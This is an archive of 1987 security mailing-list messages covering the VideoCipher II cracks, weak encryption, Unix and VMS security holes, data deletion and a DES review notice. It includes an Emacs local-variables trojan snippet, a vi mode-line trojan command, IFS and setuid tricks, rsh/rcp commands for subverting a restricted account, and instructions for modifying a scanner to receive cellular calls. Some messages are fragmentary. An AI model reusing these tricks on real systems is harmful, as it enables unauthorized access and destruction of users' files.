Subj:	The long silence is broken

Contrary to recent evidence, or lack thereof, the Security list is still
alive.  A number of random impediments to progress prevented me from
re-sending the queued mail for quite a while, including

Being horrendously busy building laser equipment

Stumbling across a strange and crippling bug in MM and having to work around
it myself with little or no support from those familiar with the code

The big Bitnet shakeup and re-ordering, during which all the Bitnet
recipients were moved to local redistributions and all internet list
maintainers had to learn how to deal with LISTSERV

The usual Christmas/holidays lossage

Being in DC for a week with no local network access [UMD was cut off]

Any number of other excuses I can come up with

I however *have* kept up with list maintenance requests and have been keeping
things therein current.  Now that things have settled down somewhat, the normal
flow of Security mail will resume.  A couple of other improvements have been
made as well; useless headers will now be stripped out before remailing and
right-widgeted message inclusions severely trimmed.

Note to Bitnet people: Some of you were receiving digest-format messages.
With the exception of one site [barilan] who requested specifically to remain,
I have moved *all* Bitnet recipients to the LISTSERV mechanism at UGA.  If you
were receiving digest format messages and can't bear to have it any other way
please send me a note and I'll fix your feed, but keep in mind it's just that
much more network bandwidth taken up at Wiscvm.  If there is sufficient demand
I'll arrange to have a separate digest distribution at UGA set up.

Thus, if you're looking for archives for December/January, there aren't any.

Subj:	DES cracked?

There's an interesting article in the 1/87 issue of Radio-Electronics
which states that the Videocipher II television-scrambling system has
been cracked.  As Videocypher depends in some part on the DES
cyphering algorithm, this may have some major implications for
computer-system security (if it's true).

According to the article, "perhaps as many as several dozen persons or
groups have, independent of one another, cracked Videocypher II and we
have seen systems in operation.  Their problem now concerns what they
should do with their knowledge."

As I recall (and I may well be wrong), M/A-Com's Videocypher II system
uses two different scrambling methods: the video signal is passed
through a sync-inverter (or some similar analog-waveform-distorter),
while the audio is digitized and passed through a DES encryption.
Information needed to decrypt the digital-audio is passed to the
subscriber's decoder box in the one of the "reserved" video lines.
The actual decryption key is not transmitted;  instead, an encyphered
key (which itself uses the box's "subscriber number" as a key) is
transmitted, decrypted by the decoder box, and used to decrypt the
audio signal.

I've heard that it's not too difficult (in theory and in practice) to
clean up the video signal, but that un-DES'ing the audio is supposed
to be one of those "unfeasibly-difficult" problems.

I can think of three ways in which the Videocypher II system might be
"cracked".  Two of these ways don't actually involve "breaking" DES,
and thus aren't all that interesting;  the third way does.

Way #1:  someone has found a way of assigning a different "subscriber
number" to an otherwise-legitimate M/A-Com decoder, and has identified
one or more subscriber numbers that are valid for many (most?)
broadcasts.  They might even have found a "reserved" number, or series
of numbers, that are always authorized to receive all broadcasts.

This is a rather minimal "crack";  the satellite companies could
defeat it by performing a recall of all subscriber boxes, and/or by
terminating any reserved subscriber numbers that have "view all"
access.

Way #2:  someome has found a way of altering a decoder's subcriber
number, and has implemented a high-speed "search for valid numbers"
circuit.  This could be done (in theory) by stepping through the
complete set of subscriber numbers, and looking for one that would
begin successfully decoding audio within a few seconds.  It should be
pretty easy to distinguish decoded audio from undecoded...

This way would be harder for the satellite companies to defeat;
they'd have to spread the set of assigned subscriber numbers out over
a larger range, so that the search for a usable number would take an
unacceptable amount of time.

Way #3: someone's actually found a way of identifying the key of a DES
transmission, with (or possibly without) the unscrambled "plaintext"
audio as a starting point.

This I find very difficult to believe... it would be difficult enough
for one person or group to do, let alone "perhaps as many as several
dozen... independent" groups.  Naturally, this possibility has the
most severe implications for computer-, organizational- and national
security.

I suspect that the reported "cracking" of Videocypher II is a case (or
more) of Method #2, and thus doesn't have immediate implications for
the computer industry (I think).

Has anyone out there heard of any other evidence that DES itself has
been cracked?

Subj:	More on the possible DES crack

I just got a copy of the 2/87 issue of Radio-Electronics, which
contains brief descriptions of several of the systems that have
"cracked" the VideoCypher II scrambling system.

The systems described are all "software" approaches that fall into what
I described as "way #1"... they work by cloning copies of an authorized
subscriber number.  At least one has found a way to crack the "tiered
distribution" feature of VideoCypher, thus permitting someone who has
paid for only one service to successfully view several others.

None of the systems described so far actually involve a "cracking" of
DES itself... they're all methods of copying an existing (valid) key
from one decoder to another.  It appears that the MA-Com folks did take
some steps to conceal the subscriber number information (which
generates the actual key dynamically, I believe), but that their steps
were not sufficient.  Apparently, the subscriber-number is stored in
the battery-backed RAM in a small TI microprocessor, and there's no
direct way to query it; during operation, though, it's apparently
possible to trace the signals on some of the micro's pins and "catch"
the subscriber number as it flys by.  Someone has found a way to do
this and to "download" the number into the micro in another decoder...
thus permitting the "cloning" of an authorized number.

So, the vulnerability of the VideoCypher II system appears to boil down
to the fact that its "innards" aren't sufficiently guarded against
probing and/or modification.  If, for example, the box had been
provided with a cover-removal switch that would signal the micro to
erase its subscriber number, it might have been more difficult to
"crack".

A description of several "hardware" approaches is promised for next
month.  I'll summarize once I get my hands on an issue.

Subject: CRYPT part II
To: tops-20@SCORE.STANFORD.EDU

Well, I had this diary of sorts that I had spent two years working on,
from around '82-'84.  I hadn't made an entry in a few months, and
when I went to decode the file I found that I had forgotten the
password.  So, last week I thought I'd do something about it.

I got the sources to the CRYPT program and I hacked it up to
try every single key.  I figured it might run for 5 or 10 years
but I wasn't in a hurry.  The key was 71 bits, but I found
what may have been a bug that reduced it to only 35.  This
computed to only about 200 days.  I tried a test case with
a simple key, and was a bit surprised when it was decoded in
about a minute.  So, I fired up the batch job that was going
to take all year to complete.  But it finished a minute later!
Yes, it was decoded.  No, it didn't try every key.  Hardly any
matter of fact.  I don't know how the algorithm was supposed to work,
but it appears that lots of keys are "equal" to each other.

I have found that I can decode any text file in about a minute.
This is using the CRYPT program (NCRYPT.FAI) that writes out
the coded file in a format like:

;crypt
ahdsj jhaud oiqmn djdud djsau kasia zajza husdh
;end

Just a warning to anyone using it;  it's worthless.

Now the questions:
Was it known this program was so bad?
Is there a good crypt program for Tops-20?  One that's been tested?

Subj:	Promiscuous mode on ethernet (and others)

Doing a promiscous listen on ethernet is a function of twiddling a bit
on your ethernet port.  For the 3com board used in PC's, just can instruct
the board to show you all traffic by setting a bit when you tell the board you
want to listen (I don't remember which bit it is, it's documented.  If there
is a demand, I'll look in our code.)  There are two ethernet monitors that
I know of off hand.  Excelan's Lanalyzer (or something like that) and
the NETWATCH program out of the PC/IP stuff.

For IBM token ring it is not possible to do promiscuous receives using
the IBM boards.  However, if you're determined, TI sells a board that
will do promiscous receives.  However the board is 1) expensive ($1500) and
2) Does not understand 802.2 so you'd have to do all your decoding yourself.
I know of no market available token ring monitoring program.

I hope this helps.  We've found NETWATCH to be very very helpful for debugging
network programs

Subj:	re: SET WATCH

Todd,

You recently asked via the SECURITY mailing list

>[...] I saw mention of a
>$SET WATCH command with VMS ...  Where did it come from ?

A query to the INFO-VAX mailing list would have been more appropriate:
the SET WATCH command was revealed there last September.
Maybe you confused the two lists?

I'm not quite certain how to interpret your question: are you
asking whence the SET WATCH command, or whence the information
about the VMS implementation?

At any rate, the SET WATCH command itself has (had) a long and
illustrious history on DEC's Tops-10 systems (Tops-20 too, I suspect).
The user could use the SET WATCH command to set flags so that the
"monitor" (operating system) would display all sorts of useful info every
time a program or command started and exited: time of day, elapsed cpu and
real time, .exe file origin (it could be persuaded to display a message
every time a shared segment was loaded, for example), disk and magtape i/o
counts, and file name and i/o type whenever a file was opened. Much of this
information was also available by typing a control-T or the USESTAT command.

(My comments are in the past tense because our DEC-10 was replaced by
8600s last year. I understand that there are a few lucky sites still
running them, though.)

The VMS implementation of SET WATCH currently only supports the display
of file i/o information. (VMS's form of control-T is similarly limited
in functionality compared to the Tops-10 version.)

SET WATCH is not a "supported" command: there is no published
information about it. What is known has come from intrepid explorers
who have used the VERB program to dump the contents of the distributed
DCL command table file:

The syntax of the command is:

    $ SET WATCH FILE/CLASS:(option1,option2...)

The following options are available:

    ALL
    ATTRIBUTES
    CONTROL_FUNCTIONS
    DIRECTORY_OPERATIONS
    DUMP
    ATTACHED
    MAJOR_FUNCTION
    NONE
    QUOTA_LENGTH

You can make this command generally available on your system by
installing the image SYS$SYSTEM:SETWATCH with the CMKRNL priv.

I hope that this brief discussion has been some help.

Subj:	Gould Secure UNIX
Cc: security@red.rutgers.edu

Yes, Gould has a C2 UNIX.  It was certified last year (October?), I
believe.  Basically, the most significant thing they did was remove
the set-uid bit.  There's also a bunch of "tracing" stuff in the
kernel, but I'm not sure exactly what is and isn't traced.

There was an item on USENET about three months ago about UTX/32S...
apparently they had a demo system at a trade show and were challenging
people to break in.  Prize was a TV set.  One guy broke in by noting
that the super-user account had the current directory in its search
path (mistake number one).  He wrote a little program, talked the
trade show guy into running it as super-user, and poof, he was in.

The stink arose because Gould refused to give him the TV set, since he
had not "played by the rules".  (They have since given him the set.)
The community was less than impressed by this, and slammed Gould
pretty hard on USENET...  Gould ended up sending this complete drivel
about "he had to convince the super-user to unwittingly help him, since
he realized immediately the system was otherwise unpenetrable" and other
factually void statements.

Finally they issued another challenge -- a TV and a VCR to break in.  Some
of us took them up on the challenge (they still have not gotten back to
us telling us when and where we get to try... I think it was a ruse),
others thought "if all you're willing to put up is a TV and VCR you must
not be too confident.  Try putting up $20,000 so it's worth our time."

Anyway, having had more than enough experience with Gould's alleged
software expertise, I'd be more than a little wary of UTX/32S without
taking a real good look at it first.

Subj:	Re:  hard drives
Cc: Security@Red.Rutgers.Edu

This depends very much on the environment in which the computer is to
be used, on the operating system, and on the degree of security that
you require.

For simple protection, you may be able to depend on built-in security
and access-control features in the computer's operating system.  Unix,
for example, has a three-level * three-privilege access control scheme,
which can be used to keep nosyparkers out of private data.  It can be
cracked, however, if someone can boot the privileged diagnostic package
and read the disk directly (or log in as "root").

Harder-to-crack protections (e.g. software protection) might be
implemented in a number of ways.  Several firms make software that can
be used to password and/or encipher the data on portions of a disk.  I
believe that Borland (vendors of Sidekick) sell a "safe-disk" utility
that enciphers data in a directory hierarchy;  I believe that it does
so by inserting itself into the device-driver path and ciphering data
during writes (and deciphering during reads).  Without the cipher
password, the data is unreadable (I believe that DES is used).

Other vendors sell similar products.  At the MacWorld expo earlier this
month, I saw a product ("MacSafe"?) that protects Macintosh disks
similarly.  It supplies both a nested-password scheme for locking
files, and a DES cipher.  Based on a conversation that I overheard
while hanging around the booth, the password scheme can be bypassed by
using a disk-sector editing tool such as FEdit (the files are simply
hidden from normal access), but the DES-ciphering is as robust as DES
itself (i.e. if you don't have the key, it'll take many moons to read
the data).

Protecting data against erasure is trickier.  You might be able to
depend on the operating system's access-control features to prevent an
existing filesystem from being modified by programs running in the
normal user environment.  To protect the data against modification by
diagnostic or stand-alone programs, you'll probably have to physically
disable the drive's ability to write new data.  Some drives have a
write-protect switch;  such a drive could be placed in a locked cabinet
next to the computer and used in a read-only mode.  If you have a drive
that has no such switch, you'll have to hack the interface between the
computer and the controller (or between the controller and the drive),
thus preventing the drive from ever seeing a "write data" order.  This
is nontrivial and should be delegated to someone who REALLY understands
the hardware.

You could, of course, copy the data from a conventional (Winchester)
hard disk to a WORM (write-once, read-many) optical disk, and then
leave the WORM copy on-line.  Or, for ultimate "no modification"
security, have the data transferred to a ROM optical disk (CD-ROM)...
expensive, but pretty secure against modification.

To meet your "for instance" (protect from erasure or access)
absolutely, there's only one way... DISCONNECT the drive from the
computer, LOCK IT UP in a physically-secure area, and don't give ANYONE
the keys!  If a drive is on-line or physically accessible, then you
must assume that someone with sufficient expertise and time will
probably be able to crack or destroy its contents.

Always best to eliminate the problem by redesigning that part in the

never leave the internals of chips.  At that point, it becomes much

Note that they can easily have the plaintext, since the best way to
start experimenting on breaking something is to have two devices
there, one subscribed and authorized, and the other not. That way you
have (subject to trivial timing differences which can be ironed out)
two streams of data to play with, and you really are just trying to 
make one look like the other. 

On another note, does anyone know of any good spectrum analysis 
software available for cheap to work with reasonable priced A/D
converters ? There are a number of companies that sell the hardware
required to eat signals, but most of the software that I have seen
for actualy analysing the data is pretty weak. Maybe I'm just not
in touch with the right companies...

Subject: hard drives

I assume that you mean a "hard drive" on an IBM PC/clone/AT kind of
computer.

The easiest way to keep a hard drive from being accessed is to
physically remove it from the computer. With removable media hard
drives and Bornelli boxes, this is a practical solution.

There isn't any other way to keep people from accessing a hard drive.
You can encrypt the data on the disk, however.

Subj:	Re: setuid csh script problem
Cc: SECURITY@RED.RUTGERS.EDU

Setuid csh scripts are dangerous, because on many implementations of
Unix the csh which executes them can be tricked into believing that it
is a login shell by exec'ing the script with argv[0] set to "-".  I
believe this has been fixed in Ultrix; I know it has been fixed in
4.3.

The problem with popen() and system() was that both calls used /bin/sh
to parse their arguments, and this shell inherited the IFS environment
variable from its parent.  By setting IFS to, say, "/", one could turn
a call to /bin/mail into a call to bin, which could be a trojan horse
of one's choosing in the current directory.  4.3 sh clears IFS on
startup, eliminating the problem.

The best loophole-finding program I know of is KUANG, written by Bob
Baldwin <baldwin@xx.lcs.mit.edu>.  It does rule-based search to find
paths of attack to gain arbitrary objective (e.g., becoming root, or
obtaining permission to write to a particular file.)  You may want to
ask him if he's willing to distribute it.

Subj:	DES is Cracked--thrice

The following message has been ported from BYTE's electronic
network.  The author is Rick Cook.
    I thought all you DES devotees would be interested.
 
 =-=-=-=-=-=-=
 
TITLE: Three Claim Breaking of DES-Based Scrambler
 
The Videocypher II scrambling system, which uses the government-
backed DES encryption algorithm to protect satellite television
signals, has apparently been broken by no less than three
different groups using different approaches. At a "scrambling
summit" in the British West Indies recently, three groups
demonstrated ways of cracking the system, which its manufacturer
and major users promote as uncrackable. The video signal is only
lightly scrambled using conventional analog techniques.
   Because the DES algorithim is so secure, cracking the signal
has been considered beyond the abilities of anyone without the
resources of a government or major corporation. None of the three
groups broke the DES algorithim directly. Instead they attacked
the hardware inside the descrambler to get at the firmware that
runs the descrambler. M/A-COM engineers had cut one of the
control pins off the unit's microprocessor to thwart such
attacks. One group reattached the pin with a laser micro-welder.
Another used a combination of out-of-spec voltages and clock
speeds to deduce the firmware. A third group said it found a flaw
in a key IC.
   M/A-COM says provisions built into the Videocypher II can foil
crackers. For example, each descrambler has several additional
keys that can be activated from the satellite uplink station.
However, the presenters at the conference claimed that for every
countermeasure there is a possible counter-countermeasure -- a
contention borne out by the history of software copy-protection.

One way to secure your machine might be to just replace *all* the keyboard
related interrupts with pointers to IRets.  Then you wouldn't have to remove
the keyboard but no-one would be able to do anything.  You could also have
another program to restore the keyboard interrupt vectors, and remotely
run it just before coming back in to work.  Not sure how you would prevent
someone from power-cycling it to undo these changes, though.

Well, if you have a big enough cabinet, you could lock the whole computer
within it; however, you would have a big cooling problem if the cabinet

If you cannot leave it in the cabinet, I'd say that there isn't much you can

Not only are many law enforcement agencies being forced to move to UHF because

In GNU Emacs 18.37.1 of Mon Feb 16 1987 on ra (berkeley-unix)

If I create the file /tmp/foo, containing the following lines:

Local Variables:
load-path: ("/tmp")

End:

and the file /tmp/outline.el:

;;; put any arbitrary code here.
(if (not (string= (user-login-name) "wesommer"))

(kill-emacs t)

then anyone who uses emacs to look at /tmp/foo and who has not yet
loaded the outline package will lose their home directory.  While I
would not be anti-social enough to do this, it should be important to
point out that the local-variables feature of emacs enables trojan
horses like this to surface.

Suggested fix: disable setting of load-path in the local-variables
list; other variables of this nature (such as shell-file-name and
exec-path) might also be protected in some way.  It may also be
possible to set various hooks in this way; it is not immediately
apparant to me how to fix this problem in general without eliminating

Subj:	secure service-type accounts 
Cc: unix-security

Here is a question I have for Sun 3.2 and Ultrix 1.2 (and 2.0) Ultrix systems.

	We would like to set up a network service for providing
the ability to use Elan's DITROFF, which is licensed for one system, from any
Ultrix or Sun machine on our network. We would like to do this without
creating hundreds of accounts on the Sun workstation.

	Two simple methods are:

		Have a password of '*' on the dummy account and have
		a list of people in the .rhost file, who can use the account.
		(This list of people/machines would include hundreds of 
		combinations)
	
		Have no password in the account, and have a special version
		of the .profile/.login/.cshrc that traps signals, and
		only allows certain commands.

It seems to me that this is insecure because people could then do:

	rsh machine -l dummy-user chmod .profile
	rcp .profile machine.dummy-user:
and then
	rlogin machine -l dummy-user

Another solution is to use the restricted shell on the Sun.
(I don't believe this is available on Ultrix 1.2)
To review my understanding of it, I would set it up as follows:

	ln /bin/sh /bin/rshell
	change /bin/{c}sh to /bin/rshell in the dummy user's password entry
	create a /secure-bin directory with just the commands needed to
		execute the tbl/eqn/nroff/troff/spell programs and scripts
		What would be NOT included is chmod, cp, ln, and some others.
		I would think it should not be writable by the dummy user.
		(this part would require the most head-scratching.)
	edit the .profile to set the search path to only point to /secure-bin
	Also add a trap 'exit 1' 0 1 2 3 15 to the .profile as the
		first command.
	chmod the .profile to 400

Now - Sun's restricted version of sh does not allow:

	execution of commands starting with '/'
	redirection of standard output

So my questions are:

	Is the approach I am taking secure? or 95% secure? Is there a better
approach? (I may be willing to settle for a 95% secure method - because this
doesn't grant root access. But as our policy is to not allow password-free
accounts - we need to justify this deviation from policy.)

	Is there a secure method of doing this for Ultrix, which doesn't
(as far as I know) have the restricted shell? If so, how was it done?
Does it require writing a program? Does anyone have a program
that is suitable for hacking?

	Does anyone have some examples on how they solved this
problem?  (This might save me a bit of head scratching and testing.)
Which commands should I leave from the special bin directory?
(besides chmod, ln, cp, rm, and mv)?

In the March 1987 (Vol 6, Number 3) issue of Monitoring Times on page 48,
there is a short article on how to modify your RadioShack Scanner to 
pick up the cellular frequencies.  (This just had to have been leaked
from someone in Tandy sales!)

1. Remove the four cabinet screws and the cabinet

2. Turn the receiver upside down and locate circuit board PC-3

3. Remove seven screws holding board and plug CN-501

4. Carefully lift up the board and locate diode soldered in place below the
   module

5. Snip one lead of the diode carefully, leaving it suspended by the other
   lead for later reattachment if desired, such as warranty repair

6. Reverse first four steps above for reassembly.  Radio will now cover
   825-845 and 870-890 MHz and search in 30 KHz increments for no-gap
   760-1300 MHz reception

(Thanks to Jim Marquand and other readers of Monitoring Times)

Subj:	[947]  Better than shredders

I have found an excellent way of disposing of classified garbage.

You find a standard industrial-grade flat rooftop that has a lot of small-grain
gravel on top, and sweep a small pile of it together.  Create a depression
in this pile, about 6 inches across.  Loosely crumple a couple of the papers
in question and ignite them.  Feed the rest of the stuff in, loosely crumpled
so it burns nicely, until there's only ashes and no paper left.  Now, tumble
and mix the pile of gravel and ashes around until all you have is blackened
gravel [a random beer bottle lying nearby served quite well as a swizzle
stick].  Leave the pile sitting there for the next time you need it.

Drawbacks: Works better at night, since rooftops tend to be windy during
the day.  However, what's left behind is completely unreadable.

Subj:	Trojan Horses in Editor Start-Up Files

Another interesting case is "vi", whose mode lines feature is
disabled by SCO ("it's not a bug, it's a feature") because they fear
that someone might leave a trojan horse in a file to be edited.  SCO
sells xenix, which is a unix clone of moderate tolerability.

A mode line containing the command "!sh my_trojan.sh"  surrounded by
the proper arrangements of comment characters and colons is what they
fear; my_trojan.sh either dispenses a prophylactic to the editor, or
creates a setuid-victim prog for benefit of the horses's owner.

I fear that the commenting-out of the proper code (rather than simply
disabling the '!' command in mode lines) is probably more than a bit
paranoid; SCO was kind enough to offer to sell me source for some
large number of thousands of dollars so that I could re-enable this
code.  Their hack is not optional on a per-site basis; they don't
offer a version with mode lines to those sites willing to risk it.

I prefer the simpler policy of cutting off the fingers of anyone who
leaves a trojan horse around without my permission.

All I can say about it is that if they had been running OUR system rather
than PROFFS then their messages really would have gotten deleted !

Still, I would think that an organization like the NSC should have the
proper support by agencys to avoid such a simple, stupid problem. I
don't expect our customers to be knowledgable about these things;
that what they pay US for. What agency is charged (if any) with the 
job of COMSEC and related security ? Would that be NSA?

A thing to note here. They did have correct levels of security there,
with the entire facility Tempest, and running at Top Secret. The
problem here is not one of clasic COMSEC; the bad guys getting into
the system. What happened here was the creation of an audit trail when 
the users did not want one to happen. You can argue that this kind of 
accountability is good or not; it did allow what actualy happened to 
come to light (no political flames here please, this is just a technical
discussion), but it can also be argued that the user is the ultimate 
authority in the circumstance, and that when they say 'delete and do
not archive' then that is what should happen. If there was a decision
taken that the system should auto-archive all message traffic, then the
users should have been explicitly warned of this, and often !

     (For those of you who get both Info-Vax and Security-Info I apologize
for the double posting.  I thought that this might be a good place to post
this message, and besides that, we need some traffic in this group!) 

     I would like to get comments from anybody about system monitoring
software that runs under VMS 4.5.  I'm specifically interested in software
that will record everything that happens during an interactive terminal
session in a manner that is completely transparent to the user.  Analysis
tools to help pinpoint users that be considered "security risks" from the
recorded data is also necessary.  I am interested in hearing about how the
package is installed (including where the software ends up, what software
is installed, what kinds of privs it wants, etc.), how well the package
works (both software and documentation), any holes/serious bugs that you've
found and any person opinions that you might have about the software.

     On the more specific side, I have just finished evaluating Clyde
Digital Systems' CONTRL, AUDIT and RTMON software packages, and I'd like to
share war stories with anyone else who has or is running any or all of
these packages (I've a *long*, very rough report on it, but if you want it
send me mail).  CONTRL is fun, but I am most interested in AUDIT and RTMON.
While running AUDIT with RTMON under it, Vaxsim showed that our system was
collecting a rather alarming number of SysBugChk (%x00000058) Events.
Before and after the evaluation period of AUDIT and RTMON *no* events were
being logged by Vaxsim, during the evaluation period I saw this number
above 4,000.  We suspect RTMON as the culprit because the system crashed
once during this period with the current process being a process that was
logged in over DECnet and analyzing the crash dump showed that the crash
was caused by R5 being set to 0.  Circumstantial evidence seemed to
indicate that UPdriver caused R5 to be set to 0.  Has anyone else been able
to pin down UPdriver of the RTMON package as the culprit for a system crash
or an unusually high number of errors on the system? 

     Oh I also discovered another gotcha, with both CONTRL and RTMON
installed under VMS 4.5, the process running CONTRL will crash the system
when CONTRLing a user logged in on a virtual terminal over a terminal
server who disconnects.  I haven't tried to deliberately recreate this one
because users tend to get a little upset when the system goes down for no
apparent reason...  If anybody else has had any similar experiences, I'd
love to hear about them.

They use a strobe.  If you have a nice, strong engine timing light and set

Subj:	[1377]  Re:  North, Pointy, et al (so to speak)

Since we run PROFS ourselves, I do not think the problem was that stuff
was not actually delete from the system when the files were erased. PROFS
actually does erase mail files when they are discarded.  From the sources I
talked to at a recent conference, I believe they fell into the trap of
good system management.  In order to prevent massive data loss in case of
a disaster, their system management does periodic backups of all files
(including mail files) on the system.  These tapes are retained for a
period of time and then recycled.  In fact, my source said that the
critical tapes were almost ready to be recycled when they were examined.

On the other side of the coin, One of IBM's big selling points on PROFS is
that in a properly managed data center, PROFS prevents the loss of
corporate assets (data) by accidental or intentional actions since the
data is managed by a central site rather than being on a PC.  All their
documentation states that for non mail files (i.e. document files), that
these files are maintained centrally and will not be lost even if removed
by the user.  My understanding was that the discovered files were, however,
mail files rather than document files.

Subj:	[1443]  Deleting messages

I wouldn't be so sure that messages are really deleted.  I understand
there are ways to reconstruct OVERWRITTEN data on a disk, given
sufficient time and resources.  SECRET disks must be overwritten several
times with various bit patterns before being unclassified, and SCI disks
must be physically destroyed.

Users desires are often in conflict.  They may want deleted things to be
really deleted, but they probably also want a way to recover something
that was accidentally deleted.  The usual resolution of this is to fix
it so that deleted things are not really deleted, but can only be
recovered by the vendor.  This may be construed as dishonest, but the
only way the client would ever find out that deleted things aren't
really deleted is if he asks you to undelete something, or if the
authorities ask you to undelete something.  In the latter case, while
you may lose the clients, it doesn't really matter since they are
quite likely in jail.

And what if you deliver a system which REALLY deletes things, but the
local system staff does regular backups, or the end user reads his
messages in hardcopy and then files them in a filecabinet or a dumpster?
True deletion requires a complete overview, which neither the vendor nor
the end user or the local system staff generally has.

Assuming that you find out that somebody left the trojan horse around
in the first place. The cleaver people who break security don't
announce the fact -- they just use their extra access whenever
necessary, always very discretely.

Subj:	[1883]  Re:  Deleting messages

In the system that we have here, you have the choice as the sender of the 
message to determine if you want the ARCHIVE bit set on or not. ARCHIVE
function assures that the message will get logged as archived in a 
list online, and that the end of the day Archive tape will include this 
message. Note that the archival tapes are encrypted, and that two copies 
are kept, one onsite and one off. U can have the bit set automaticaly
for certain classes of messages, but in all cases the system will remind
you that the message is getting archived. As to erasure of deleted messages,
the standard guidlines are followed for the deletion of Secret information.
A number of passes are made on the file blocks, writting selected patters
(patterns) of data. All to the recomendations of the folks up the Parkway
from here (we are in Greenbelt MD). If the system were ever to handle 
SCI or higher data, then provisions would have to be made to destroy 
disk storage media when it had filled up, and of course to assure that 
once a disk block was used it was not used again. The system already
has the capability to use a particular disk device for a particular 
class of message.

Obviously, the important thing here is that the user needs to be very 
aware of exactly where their data is going, and what is being done with 
it when it is sensitive data. If North and company had known that all of
their wonderful data was going to around for people to see, then I expect
that there might have been held an emergency destruction drill at the 
NSC office that might have included the system hardware itself ! Since
they are running IBM and PROFFS, this would seem to be no great loss....

Lets here it for a better educated user community !!

While this doesn't deal directly with TCP-IP, it is a *very* important
consideration in the Internet in particular, and any network in general.

Often a so-called 'breakin' does not even require that a user maliciously
"try their neighbors doors" to see if they can gain restricted permissions
or access.  Often curiosity alone is enough to cause problems. Example 1:
a first-time UNIX user was learning about the file system, and in particular
how to delete files.  He was told that he could only delete files owned by
him, and by way of counterexample his mentor typed "rm /etc/passwd".
Surprise, /etc was writeable and the file was gone.  Example two: the recent
rlogin breakins at Stanford.  Example 3: Obviously if you have hardware
access to the transmission medium you can unintentionally wreak havoc merely
by using someone elses IP address.

I too would like to live in a word where I can leave my "door unlocked".
Unfortunately it doesn't take more than a very few nasty or ignorant persons
to cause problems.  Due to the fact that computers have evolved in an
atmosphere of sharing (time sharing, memory sharing, src sharing..)
we have yet to realize the responsibilities and risks of trusting them too
much.  I.e., there is a big difference between leaving your door
unlocked but closed, and spreading $20.00 bills on your front lawn.
In the case of J. Hubbards 'wall' to the Net, the problem was not
caused by a malicious person, but by simple curiosity.

At the recent TCP/IP Conference in Monterey CA, some discussion was
given to "network security".  From the military standpoint they want
the ability to send data through a network, such that anyone who
captures the data won't be able to read or use it.  While this may
be a prerequisite for the military, I don't think that 'normal' users
should expect that their Email be any more secure than their USMail.
The best method of keeping something secure on a network is to physically
seperate it.  Or, do what I do, and don't put anything on the system
which you wouldn't read by someone else under the worst case scenario.

Fixing security 'features' is obviously important, and should be pursued.
Catching malicious persons doing damage is also extremely important.  But
"catching the theives" is not the answer to a lack of network security.
If your network rolls out a red-carpet to someone then don't be surprised
if you find muddy footprints on it the next morning.  I leave you with
two examples quoted from the January 1987 issue of the ACM Software
Engineering Notes...

    "The computer security administrator at Roche ... had been
     plagued by a hacker who auto-dialed the entire Roche phone
     system in sequence.  .... They laid a hacker trap on one of
     the PC's and traced the call.  Once the suspect was found,
     it was even harder to get him arrested since he was in
     New York, and Roche in New Jersey (which got the FBI involved).
     The perp was brought into the police station and had the riot
     act read to him...  He was not charged -- because there wasn't
     a **no-trespassing** sign on the hacker trap identifying the
     system as private proberty of Roche."

     " "Welcome to the ______ System" ... A Mass. financial firm
      that had attempted to prosecute a hacker who had penetrated
      their system.  The defense lawyer argued that the system had
      a greeting that welcomed people to the system, and that was
      tantamount to welcoming someone intor your home.  The judge
      threw out the case, accepting the arguments of the defense.."

[Docket No. 70109-7009]

Second Review of Federal Information Processing Standard 46,
Data Encryption Standard (DES)

AGENCY: National Bureau of Standards, Commerce.

ACTION: Notice of second review of federal information processing
standard (FIPS) 46, data encryption standard.

----------------------------------------------------------------------

SUMMARY:  Federal Information Processing Standard 46, Data Encryption
Standard, issued in 1977, provides an algorithm to be implemented in
electronic hardware devices and used for the cryptographic protection
of computer data.  The standard provided that it be reviewed within
five years to assess its adequacy.  The first review was completed in
1983, and the standard was reaffirmed for Federal government use (48
FR 41062 dated September 13, 1983).

  The purpose of this notice is to announce the second review to
assess the continued adequacy of the standard to protect computer
data.  Comments from industry and the public are invited on the
following alternatives for FIPS 46.  The costs (impacts) and benefits
of these alternatives should be included in the comments.

o Reaffirm the standard for another five (5) years.  The National
  Bureau of Standards would continue to validate equipment that
  implements the standard.  FIPS 46 would continue to be an approved
  method for protecting unclassified computer data against
  unauthorized modification or disclosure.

o Withdraw the standard.  The National Bureau of Standards would no
  longer continue to support the standard.  Organizations could
  continue to utilize existing equipment that implements the standard,
  and non-government organizations could continue to develop new
  implementations as desired.  Government organizations would begin to
  utilize new security devices as they become available through the
  Commercial Communication Security Endorsement Program of the
  National Security Agency.

o Revise the applicability of the standard.  The applicability
  statement of the standard would be changed to specify certain uses,
  such as using the standard for protecting Electronic Funds
  Transfers.  Proposed technical changes to the algorithm will not be
  considered during this review.

  Interested parties may obtain a copy of FIPS 46 from the National
Technical Information Service (NTIS), 5285 Port Royal Road,
Springfield, VA 22161,  telephone (703) 487-4650.

DATE: Comments on this second review of FIPS 46 must be received on or
before June 4, 1987.

ADDRESS: Written comments concerning this standard should be submitted
to the Director, Institute for Computer Sciences and Technology, ATTN:
Second Review of FIPS 46, Technology Building, Room B154,
Gaithersburg, MD 20899.

  Written comments received in response to this notice will be made
part of the public record and will be made available for inspection

Subj:	[608]  Re: Deleting messages

Granted, your typical delete-a-file fuction does not actually erase the data
from the disk, but actually marks the space as unused for later reallocation.

This, however, has an easy remedy:

You would simply modify your delete fuction to first overwrite the file with
zeros, or your favorite ASCII character, before it marks the space as
'unused'.

This process would ensure that a file that is deleted would be completely
erased from the medium.

Subj:	[1290]  Deleting messages

I've seen an amusing variation at some installations.

Typically, for some reason (which seemed clever at the time), the
system's mgt decides to use a tape archive (eg. UNIX CPIO or TAR) to
do backups rather than some rational utility. A good example of a
reason is that you can use a 'find' pipe with CPIO and back up files
only if the meet some condition which, if you like, can be quite
convuluted (> N days old, > N bytes, !owned by system etc), usually
to save tape and backup time.

Well, these utilities back up files, but not deletions. If a disaster
occurs and the system has to be recreated one sees all the deleted
files return to disk with whatever protections they happened to have
when backed up. Needless to say someone who (eg) was going on
sabbatical for a year and cleaned up all their sensitive files might
be somewhat miffed to come back and find they had been sitting back on
the disk for the past 11 months.

Obviously the fix is to also backup recent copies of the state of the
directories and apply those last, but this doesn't seem to be done by
these sites when they report problems on the technical lists.

Subj:	[2239]  Reconstructing overwritten data

I don't know exactly how.  I think it involves careful measurement of
residual magnetism.  For instance if the magnetism of a binary 0 is
nominally -100 and of a binary 1 is nominally +100, then a 0 overwritten
with a 1 might be +98, a 0 overwritten with a 0 might be -102, a 1
